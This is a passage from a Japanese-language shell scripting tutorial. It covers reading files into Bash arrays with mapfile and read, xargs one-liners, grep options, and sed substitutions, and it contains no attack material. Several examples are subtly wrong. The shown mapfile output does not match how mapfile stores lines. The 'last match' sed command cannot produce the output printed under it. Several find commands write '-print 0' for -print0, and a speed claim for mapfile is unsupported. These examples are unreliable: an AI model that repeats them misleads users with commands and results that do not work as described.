</code></pre><h3 id=登場-mapfile-を使う>登場！ mapfile を使う</h3>
<p>なんと、ファイル読み込みや配列への代入にあれこれやっていましたが、mapfileを使うと１行で住みます。<br>
<code>COUNT</code>変数といったカウンターや IFSといった定義も不要です。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:data02.txt data-lang=:data02.txt>One Two Three
Four Five Six
Seven Eight Nine
Ten
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:array03.sh data-lang=bash:array03.sh><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nv>DATAFILE</span><span class=o>=</span><span class=s2>&#34;data.txt&#34;</span><span class=p>;</span>  <span class=c1># データファイル</span>
<span class=nb>declare</span> -a aLine<span class=p>;</span>     <span class=c1># 配列の宣言</span>
 
<span class=c1># -t は行末の改行を除去</span>
mapfile -t aLine &lt; <span class=s2>&#34;</span><span class=nv>$DATAFILE</span><span class=s2>&#34;</span><span class=p>;</span>

<span class=nb>echo</span> <span class=s2>&#34;配列の内容すべてを表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[@]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One Two Three</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の0を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[0]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の1を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[1]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Two</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の2を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[2]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Three</span>
</code></pre></div><p>実行結果はいずれも同じですが以下のとおりです。</p>
<pre tabindex=0><code>bash-3.2$ bash array03.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
</code></pre><p>すごいですね。<br>
配列に入れるだけなら<code>mapfile</code>で十分です。しかも読み込み専用ということもあり、読み込み速度は通常の数十倍高速です。</p>
<h3 id=列の代入>列の代入</h3>
<p>ここで余談ですが、これまでは行の読み込みを行い、行を単位に配列に格納してきました。<br>
列の中で空白区切りで値が入っている場合の配列への代入はどうしましょう？</p>
<p>こうなります。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:col.sh data-lang=bash:col.sh><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=c1># １行に３つの値が空白区切りで並んでいます</span>
<span class=nb>read</span> -a aLine <span class=o>&lt;&lt;&lt;</span> <span class=s2>&#34;One Two Three&#34;</span>

<span class=nb>echo</span> <span class=s2>&#34;配列の内容すべてを表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[@]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One Two Three</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の0を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[0]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の1を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[1]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Two</span>
<span class=nb>echo</span> <span class=s2>&#34;添字の2を表示&#34;</span>
<span class=nb>echo</span> <span class=si>${</span><span class=nv>aLine</span><span class=p>[2]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Three</span>
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-3.2$ bash col.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
</code></pre><h3 id=データファイルからの入力>データファイルからの入力</h3>
<p>では、データファイルの構造を少し複雑にしてみます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-data02.txt data-lang=data02.txt>One Two Three
Four Five Six
Seven Eight Nine
Ten
</code></pre></div><p><code>mapfile</code>コマンドで行の内容を配列に入れる方法は説明しましたが、今回は、行の中で空白区切りの値が３つあります。<br>
こうしたデータ構造を<code>mapfile</code>に加えて<code>read</code>コマンドを使って効率的に、かつ高速に読み込んでみます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash:colArray.sh data-lang=bash:colArray.sh><span class=cp>#!/usr/bin/bash
</span><span class=cp></span>
<span class=nv>DATAFILE</span><span class=o>=</span><span class=s2>&#34;data02.txt&#34;</span><span class=p>;</span>
<span class=nb>declare</span> -a aLine<span class=p>;</span>

<span class=c1># データファイルを読み込みます。</span>
mapfile -t aLine&lt;<span class=s2>&#34;</span><span class=nv>$DATAFILE</span><span class=s2>&#34;</span><span class=p>;</span>

<span class=k>for</span><span class=o>((</span><span class=nv>i</span><span class=o>=</span>0<span class=p>;</span>i&lt;4<span class=p>;</span>i++<span class=o>))</span><span class=p>;</span><span class=k>do</span>

  <span class=c1># 行の内容を読み込み、空白区切りで配列に格納します</span>
  <span class=nb>read</span> -a var <span class=o>&lt;&lt;&lt;</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>aLine</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>

  <span class=nb>echo</span> <span class=s2>&#34;varの中身は以下の通り&#34;</span><span class=p>;</span>
  <span class=nb>echo</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>var</span><span class=p>[@]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
  <span class=nb>echo</span> <span class=s2>&#34;添字の0を表示&#34;</span>
  <span class=nb>echo</span> <span class=si>${</span><span class=nv>var</span><span class=p>[0]</span><span class=si>}</span><span class=p>;</span> <span class=c1># One</span>
  <span class=nb>echo</span> <span class=s2>&#34;添字の1を表示&#34;</span>
  <span class=nb>echo</span> <span class=si>${</span><span class=nv>var</span><span class=p>[1]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Two</span>
  <span class=nb>echo</span> <span class=s2>&#34;添字の2を表示&#34;</span>
  <span class=nb>echo</span> <span class=si>${</span><span class=nv>var</span><span class=p>[2]</span><span class=si>}</span><span class=p>;</span> <span class=c1># Three</span>
<span class=k>done</span>
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-3.2$ bash colArray.sh
varの中身は以下の通り
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
varの中身は以下の通り
Four Five Six
添字の0を表示
Four
添字の1を表示
Five
添字の2を表示
Six
varの中身は以下の通り
Seven Eight Nine
添字の0を表示
Seven
添字の1を表示
Eight
添字の2を表示
Nine
varの中身は以下の通り
Ten
添字の0を表示
Ten
添字の1を表示

添字の2を表示

bash-3.2$
</code></pre><p>最後の行は値が一つしかありません（Ten）<br>
必要であれば値がない場合は出力しないなどの処理をすれば良さそうです。<br>
（配列的には別に値がなくても問題はないと思いますが）</p>
<p><code>mapfile</code>と<code>read</code>コマンドを上手に使って、効率的に配列に代入してください。</p>
<h2 id=xargs>xargs</h2>
<h3 id=タブを区切り文字として設定-デフォルト-スペース>タブを区切り文字として設定 (デフォルト: スペース)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>xargs -d<span class=se>\t</span>
</code></pre></div><h3 id=コマンドを実行する前にコマンドをプロンプトする>コマンドを実行する前にコマンドをプロンプトする</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ls<span class=p>|</span>xargs -L1 -p head
</code></pre></div><h3 id=1-行に-3-項目を表示>1 行に 3 項目を表示</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> <span class=m>1</span> <span class=m>2</span> <span class=m>3</span> <span class=m>4</span> <span class=m>5</span> 6<span class=p>|</span> xargs -n3
<span class=c1># 1 2 3</span>
<span class=c1># 4 5 6</span>
</code></pre></div><h3 id=実行前のプロンプト>実行前のプロンプト</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> a b c <span class=p>|</span>xargs -p -n3
</code></pre></div><h3 id=find-の結果を-rm-する><code>find</code> の結果を <code>rm</code> する</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -name <span class=s2>&#34;*.html&#34;</span><span class=p>|</span>xargs rm
</code></pre></div><h3 id=ファイル名に空白が含まれるファイルを削除します-例-hello-2001>ファイル名に空白が含まれるファイルを削除します (例: 「hello 2001」)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -name <span class=s2>&#34;*.c&#34;</span> -print0<span class=p>|</span>xargs -0 rm -rf
</code></pre></div><h3 id=ファイルをフォルダに移動>ファイルをフォルダに移動</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -name <span class=s2>&#34;*.bak&#34;</span> -print 0<span class=p>|</span>xargs -0 -I <span class=o>{}</span> mv <span class=o>{}</span> ~/old
</code></pre></div><p>または、</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find . -name <span class=s2>&#34;*.bak&#34;</span> -print 0<span class=p>|</span>xargs -0 -I file mv file ~/old
</code></pre></div><h3 id=最初の-100-番目のファイルをディレクトリ-例-d1-に移動します>最初の 100 番目のファイルをディレクトリ (例: d1) に移動します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ls <span class=p>|</span>head -100<span class=p>|</span>xargs -I <span class=o>{}</span> mv <span class=o>{}</span> d1
</code></pre></div><h3 id=並行処理>並行処理</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>time</span> <span class=nb>echo</span> <span class=o>{</span>1..5<span class=o>}</span> <span class=p>|</span>xargs -n1 -P5 sleep
</code></pre></div><h3 id=すべてのファイルを-a-から-b-にコピーします>すべてのファイルを A から B にコピーします</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find /dir/to/A -type f -name <span class=s2>&#34;*.py&#34;</span> -print 0<span class=p>|</span> xargs -0 -r -I file cp -v -p file --target-directory<span class=o>=</span>/path/to/B
</code></pre></div><h3 id=ファイル名をファイルの最初の行に追加します>ファイル名をファイルの最初の行に追加します</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ls <span class=p>|</span>sed <span class=s1>&#39;s/.txt//g&#39;</span><span class=p>|</span>xargs -n1 -I file sed -i -e <span class=s1>&#39;1 i\&gt;file\&#39;</span> file.txt
</code></pre></div><h3 id=すべてのファイルの行数を出力>すべてのファイルの行数を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ls <span class=p>|</span>xargs -n1 wc -l
</code></pre></div><h3 id=出力を-1-行にする>出力を 1 行にする</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ls -l<span class=p>|</span> xargs
</code></pre></div><h3 id=すべてのファイルの行をカウントし合計行もカウントします>すべてのファイルの行をカウントし、合計行もカウントします</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>ls<span class=p>|</span>xargs wc -l
</code></pre></div><h3 id=xargs-と-grepを組み合わせる>Xargs と grepを組み合わせる</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>cat grep_list <span class=p>|</span>xargs -I<span class=o>{}</span> grep <span class=o>{}</span> filename
</code></pre></div><h3 id=xargs-と-sed-etc-ディレクトリの下のすべての古い-ip-アドレスを新しい-ip-アドレスに置き換えます>Xargs と sed (/etc ディレクトリの下のすべての古い IP アドレスを新しい IP アドレスに置き換えます)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>grep -rl <span class=s1>&#39;192.168.1.111&#39;</span> /etc <span class=p>|</span> xargs sed -i <span class=s1>&#39;s/192.168.1.111/192.168.2.111/g&#39;</span>
</code></pre></div><h2 id=grepコマンド>grepコマンド</h2>
<ul>
<li>コマンドの実行結果から必要な箇所だけを抽出する</li>
<li>単語単位で検索する</li>
<li>前後の行も表示する</li>
<li>行番号付きで表示する</li>
<li>複数の文字列を指定して検索する</li>
<li>複数の文字列を指定して検索する（正規表現）</li>
<li>検索文字列をファイルから読み込む</li>
<li>どちらも含む行を探したい場合</li>
<li>文字列を含まない行を対象にする</li>
</ul>
<h3 id=grepコマンド概要>grepコマンド概要</h3>
<p><code>grep</code>コマンドは、ファイル中の「文字列（パターン）」が含まれている行を表示するコマンドで、UNIX/Linuxで、最も頻度高く利用されているコマンドの一つです。</p>
<p>　文章中に検索したい文字列の位置や頻出回数を確認する<br>
　ディレクトリ中のファイル一覧を作成し、そのファイル一覧から、該当するファイル名を探索する。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>抽出した結果をさらに「パイプ｜コマンド」で絞り込んだり、その結果を別のファイルに出力したりすることも簡単にできます。</dd>
</dl>
</div>
<h3 id=grepコマンドの書式>grepコマンドの書式</h3>
<p>grep [オプション] 検索パターン ファイル<br>
コマンド | grep [オプション] 検索パターン</p>
<h3 id=grepコマンドの主なオプション>grepコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>大文字と小文字を区別しない</td>
</tr>
<tr>
<td>-v</td>
<td>パターンに一致しない行を表示する</td>
</tr>
<tr>
<td>-n</td>
<td>行番号を併せて表示する</td>
</tr>
<tr>
<td>-C</td>
<td>一致した行の前後の行も表示する</td>
</tr>
<tr>
<td>-e</td>
<td>検索パターンを指定する</td>
</tr>
<tr>
<td>-f</td>
<td>ファイルに書かれているパターンを検索する</td>
</tr>
</tbody>
</table>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>一覧のオプションは一部です。 $ man grep などで、grepの使い方を確認してください。</dd>
</dl>
</div>
<h3 id=grepコマンド詳細説明>grepコマンド詳細説明</h3>
<h3 id=コマンドの実行結果から必要な箇所だけを抽出する>コマンドの実行結果から必要な箇所だけを抽出する</h3>
<p>　「dmesg」コマンド（起動時のシステムメッセージを再表示するコマンド）の実行結果から、grepコマンドで“volume”という文字列を含む行だけを表示したい場合は「dmesg | grep volume」と指定します</p>
<p>システムメッセージを表示する</p>
<pre tabindex=0><code>$ dmesg
</code></pre><p>システムメッセージの出力から「volume」を含む行を抽出する</p>
<pre tabindex=0><code>$ dmesg | grep volume
</code></pre><p>大文字と小文字を「-iオプション」を付与して区別しないで抽出する</p>
<pre tabindex=0><code>$ dmesg | grep -i volume
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>dmesg コマンドは、システムメッセージを表示するコマンドです。</dd>
</dl>
</div>
<h3 id=単語単位で検索する>単語単位で検索する</h3>
<p>「volume」という文字列を検索したい場合、、検索結果には「volume」と「vboxvolume」が表示される場合もあります。“volumeという単語のみ”を検索対象としたい場合には、「-w」オプション（&ndash;word-regexp）を使用します</p>
<p>単語単位で検索する</p>
<pre tabindex=0><code>$ dmesg | grep -i -w volume
</code></pre><h3 id=前後の行も表示する>前後の行も表示する</h3>
<p>　文字列を検索する際には、該当する行の前後も表示されていると分かりやすい場合があります。例えば、前後2行ずつ表示したい場合は、「-2」のように数字で指定します。これは「-C（&ndash;context=）」オプションと同じです。</p>
<pre tabindex=0><code>$ dmesg | grep -w -C2 volume
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ログなどでの利用は効果的ではありませんが、ドキュメント内を検索する場合に、GoogleのSnippetのように前後の文章が表示されることで、よりわかりやすくなります。さらに次の項目では、検索結果の評判号を表示させることもできます。</dd>
</dl>
</div>
<h3 id=行番号付きで表示する>行番号付きで表示する</h3>
<p>grepコマンドでの検索結果に行番号を付けて表示したい場合は、「-n」オプション（&ndash;line-number）を使用します。「行番号:」のように表示されますが、前後の行も併せて表示している場合は、前後の行は「行番号-」のように「-」記号で、該当する行は「:」記号で示されます。</p>
<pre tabindex=0><code>$ dmesg | grep -w -C2 -n volume
</code></pre><h3 id=複数の文字列を指定して検索する>複数の文字列を指定して検索する</h3>
<p>grepコマンドで「volumeまたはkeybagを含む行を検索」のように、複数の文字列を検索したい場合には、「-e」オプションを付けて、それぞれが「検索パターン」であることを明示します。</p>
<pre tabindex=0><code>$ dmesg | grep -i -e keybag -e volume
</code></pre><h3 id=複数の文字列を指定して検索する-1>複数の文字列を指定して検索する</h3>
<p>複数の文字列を検索したい場合、正規表現で“または”という意味の「|」記号を使って指定することもできます。</p>
<pre tabindex=0><code>$ dmesg | grep -i &quot;keybag\|volume&quot;
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ここでは OR 条件で抽出することを目的としています。AND条件で抽出する場合は、grep コマンドを「|」パイプコマンドで連結させます。</dd>
</dl>
</div>
<p>どちらの検索ワードも含む行</p>
<pre tabindex=0><code>$ dmesg | grep -i volume | grep -i keybag
</code></pre><h3 id=検索文字列をファイルから読み込む>検索文字列をファイルから読み込む</h3>
<p>検索したい文字列が常に決まっている場合や、他のコマンドで単語をリストアップしているなどで、検索文字列のリストがあるような場合、「-f」オプションでリストのファイルを指定するとよいでしょう。</p>
<pre tabindex=0><code>$ cat wordlist
keybag
volume
$ dmesg | grep -i -f wordlist
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>この使い方は意外と知られていないのです。一般的にはwordlistをシェルスクリプトであらかじめ作成しておき、while read line; do などで wordlistを順番にgrepコマンドに渡す手法が多いです。</dd>
</dl>
</div>
<pre tabindex=0><code class=language-:bash data-lang=:bash>
:&gt; wordlist
echo &quot;keybag&quot; &gt;&gt; wordlist;
echo &quot;volume&quot; &gt;&gt; wordlist;

cat wordlist | while read line; do
  echo &quot;$line での検索&quot;;
  dmesg | grep &quot;$line&quot; ;
  echo &quot;&quot;;
done
</code></pre><h3 id=どちらも含む行を探したい場合>どちらも含む行を探したい場合</h3>
<p>　「どちらの検索ワードも含む行」としたい場合は、検索結果をさらにgrepするのが簡単です。</p>
<pre tabindex=0><code>$ dmesg | grep -i volume
$ dmesg | grep -i keybag 

# どちらの検索ワードも含む行
$ dmesg | grep -i volume | grep -i keybag
</code></pre><h3 id=文字列を含まない行を対象にする>文字列を含まない行を対象にする</h3>
<p>grepコマンドで「～を含まない行」だけを表示したい場合は「-v」オプション（「&ndash;invert-match」オプション）を使います。</p>
<pre tabindex=0><code># keybag を含みvolumeを含まない検索結果
$ dmesg | grep -i keybag | grep -v volume
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>-v オプションはgrepコマンドのオプションの中で最も強力で利用頻度が高いです。「パターンに一致しない行を表示する」という意味合いとなります。</dd>
</dl>
</div>
<h2 id=sedコマンド>sedコマンド</h2>
<p>　「sed」は「Stream EDitor」の略で、「sed スクリプトコマンド ファイル名」で、指定したファイルをコマンドに従って処理し、標準出力へ出力します。ファイル名を省略した場合は、標準入力からのデータを処理します。sedコマンドでは、パイプとリダイレクトを活用するのが一般的です。</p>
<h3 id=sedコマンドの書式>sedコマンドの書式</h3>
<p>sed [オプション]<br>
sed [オプション] スクリプトコマンド 入力ファイル</p>
<h3 id=sedコマンドの主なオプション>sedコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-e スクリプト</td>
<td>スクリプト（コマンド）を追加する</td>
</tr>
<tr>
<td>-f スクリプトファイル</td>
<td>実行するコマンドとしてスクリプトファイルの内容を追加する</td>
</tr>
</tbody>
</table>
<p>|-t 文字数 |タブの文字数またはタブ位置のリストを指定する|</p>
<h3 id=sedのバージョンを確認する>sedのバージョンを確認する</h3>
<pre tabindex=0><code>$ sed --version
</code></pre><p>僕の環境では以下のとおりです</p>
<pre tabindex=0><code>bash-5.1$ sed --version
gsed (GNU sed) 4.8
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;https://gnu.org/licenses/gpl.html&gt;.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Jay Fenlason, Tom Lord, Ken Pizzini,
Paolo Bonzini, Jim Meyering, and Assaf Gordon.

This sed program was built without SELinux support.

GNU sed home page: &lt;https://www.gnu.org/software/sed/&gt;.
General help using GNU software: &lt;https://www.gnu.org/gethelp/&gt;.
E-mail bug reports to: &lt;bug-sed@gnu.org&gt;.
bash-5.1$
</code></pre><h3 id=sedコマンド詳細説明>sedコマンド詳細説明</h3>
<h3 id=sedを使用した基本的なテキスト置換>&lsquo;sed&rsquo;を使用した基本的なテキスト置換</h3>
<p><code>sed</code>コマンドを使用してパターンを検索および置換することにより、テキストの特定の部分を検索および置換できます。次の例では、「s」は検索および置換タスクを示します。「BashScriptingLanguage」というテキストで「Bash」という単語が検索され、その単語がテキストに存在する場合は、「Perl」という単語に置き換えられます。</p>
<pre tabindex=0><code>bash-5.1$ echo &quot;Bash Scripting Language&quot; | sed 's/Bash/Perl/'
Perl Scripting Language
bash-5.1$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>'&rsquo; シングルクォーテーションで囲む場合と"&ldquo;ダブルクォーテーションで囲む場合、動作が異なります。置換前と、置換後の文字列指定を「文字列」で扱う場合はシングルクォーテーションで構いませんが、s/Bash/$value/ などの変数で置き換えたい場合はダブルクォーテーションで囲みます。</dd>
</dl>
</div>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>s/Bash/Perl/ と指定する場合の s ですが、substitute（置き換える）です。</dd>
</dl>
</div>
<p>まず、weekday.txtを作成します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:weekday.txt data-lang=:weekday.txt>Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
Sunday
</code></pre></div><p>以下のコマンドで Sunday を　Sunday is holiday に置き換えます</p>
<pre tabindex=0><code>$ cat weekday.txt | sed 's/Sunday/Sunday is holiday/'
</code></pre><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-5.1$ cat weekday.txt | sed 's/Sunday/Sunday is holiday/'
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
Sunday is holiday
bash-5.1$
</code></pre><h3 id=gオプションを使用してファイルの特定の行にあるテキストのすべてを置き換える>&lsquo;g&rsquo;オプションを使用して、ファイルの特定の行にあるテキストのすべてを置き換える</h3>
<p>&lsquo;g&rsquo;オプションは、ファイル内の一致するパターンすべてを置き換えます。</p>
<p>まずpython.txtを作成します</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:python.txt data-lang=:python.txt>Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre></div><p>以下のコマンドで Python を perl に置き換えます。</p>
<pre tabindex=0><code>$ cat python.txt | sed 's/Python/perl/g' python.txt
</code></pre><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-5.1$ cat python.txt | sed 's/Python/perl/g'
perl is a very popular language.
perl is easy to use. perl is easy to learn.
perl is a cross-platform language
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>s/Python/perl/g と指定する場合の g ですが、global(全体的に）です。</dd>
</dl>
</div>
<p>次に２行目の Python を perlに置き換えます。<br>
置き換えたい行数を 2 と指定しています。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:python.txt data-lang=:python.txt>Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre></div><pre tabindex=0><code>$ cat python.txt | sed '2 s/Python/perl/g' python.txt
</code></pre><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-5.1$ cat python.txt | sed '2 s/Python/perl/g'
Python is a very popular language.
perl is easy to use. perl is easy to learn.
Python is a cross-platform language
</code></pre><h3 id=各行で一致する2番目の値のみを置き換える>各行で一致する2番目の値のみを置き換える</h3>
<p>ファイル中に存在するPythonを、各行の2番目に出現する検索パターンだけをperlに置き換えます。</p>
<p>g2オプションを使います。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:python.txt data-lang=:python.txt>Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-5.1$ cat python.txt | sed 's/Python/perl/g2'
Python is a very popular language.
Python is easy to use. perl is easy to learn.
Python is a cross-platform language
bash-5.1$
</code></pre><h3 id=各行で一致する最後の値のみを置き換える>各行で一致する最後の値のみを置き換える</h3>
<p>ファイル中に存在するPythonを、各行の最後に出現する検索パターンだけをperlに置き換えます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:python.txt data-lang=:python.txt>Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-5.1$ cat python.txt | sed 's/\(.*\)Programming/\1Scripting/' 
Python is a very popular language.
Python is easy to use. perl is easy to learn.
Python is a cross-platform language
bash-5.1$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>\(.*\) の部分は正規表現といいます。正規表現は記号を含めて無限に指定することができる激しく便利な機能です。ポピュラーな使い方から覚えて、次第と複雑でトリッキーな使い方を習得していけば良いと思います。Google で sed 正規表現　と検索すればたくさん検索結果が出てきます。</dd>
</dl>
</div>
<h3 id=ファイル内の最初の一致を新しいテキストに置き換える>ファイル内の最初の一致を新しいテキストに置き換える</h3>
<p>次のコマンドは、検索パターンの最初の一致である「Python」のみをテキスト「perl」に置き換えます。ここで、「1」はパターンの最初の出現に一致するために使用されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:python.txt data-lang=:python.txt>Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat python.txt | sed '1 s/Python/perl/'
perl is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre><h3 id=ファイル内の最後の一致を新しいテキストに置き換える>ファイル内の最後の一致を新しいテキストに置き換える</h3>
<p>次のコマンドは、最後に出現した検索パターン「Python」をテキスト「Bash」に置き換えます。ここで、「$」記号は、パターンの最後の出現と一致するために使用されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:python.txt data-lang=:python.txt>Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat python.txt | sed '$s/Python/perl/'
Python is a very popular language.
Python is easy to use. Python is easy to learn.
perl is a cross-platform language
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>「ファイル内」の最後のマッチです。</dd>
</dl>
</div>
<h3 id=ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ>ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ</h3>
<p>検索および置換するには、ファイルパスのバックスラッシュをエスケープする必要があります。次の<code>sed</code>コマンドは、ファイルパスにバックスラッシュ記号（\）を追加します。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>\記号はウインドウズだと￥で表示されます。<br>
Macでは￥キーを押すことで\バックスラッシュを入力することできます。<br>
Macで￥キーを押してもバックスラッシュが入力できない場合は、はOptionキーを押しながら￥を押すことでバックスラッシュを入力することができます。一般的に￥と\は区別されています。</dd>
</dl>
</div>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ echo /home/ubuntu/code/perl/add.pl | sed 's;/;\\/;g'
\/home\/ubuntu\/code\/perl\/add.pl
$
$ echo /home/ubuntu/code/perl/add.pl | sed 's|/|\\/|g'
\/home\/ubuntu\/code\/perl\/add.pl
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>上記では「s;」とすることで、セミコロンを区切り文字として指定しています。理由は見た目がわかりやすいからです。<br>
何でもいいのです。「s|」とすれば、区切り文字はパイプに指定することができます。</dd>
</dl>
</div>
<h3 id=ファイルのフルパスをファイル名だけに置き換える>ファイルのフルパスをファイル名だけに置き換える</h3>
<p>ファイル名は、<code>basename</code>コマンドを使用してファイルパスから非常に簡単に取得できますが、<code>sed</code>コマンドを使用して、ファイルパスからファイル名を取得することもできます。次のコマンドは、<code>echo</code>コマンドで指定されたファイルパスからのみファイル名を取得します。</p>
<pre tabindex=0><code>$ basename &quot;/home/ubuntu/temp/myfile.txt&quot;
myfile.txt

$ echo &quot;/home/ubuntu/temp/myfile.txt&quot; | sed 's/.*\///'
myfile.txt
$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>basename コマンドを使うのが一般的ですが、sedに置き換えることでsedの正規表現の理解を深めることが狙いです。</dd>
</dl>
</div>
<h3 id=マッチした文字列のあとに出現した文字列が見つかった場合に置換する>マッチした文字列のあとに出現した文字列が見つかった場合に置換する</h3>
<p>次の<code>sed</code>コマンドでは、2つの置換コマンドが使用されています。文字列「CSE 」でマッチした行で「Count 」は100に置き換えられ、文字列「EEE」でマッチした行で「Count」は70に置き換えられます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:dept.txt data-lang=:dept.txt>CSE - Count
EEE - Count
Civil - Count
</code></pre></div><p>実行結果は以下のとおりです。</p>
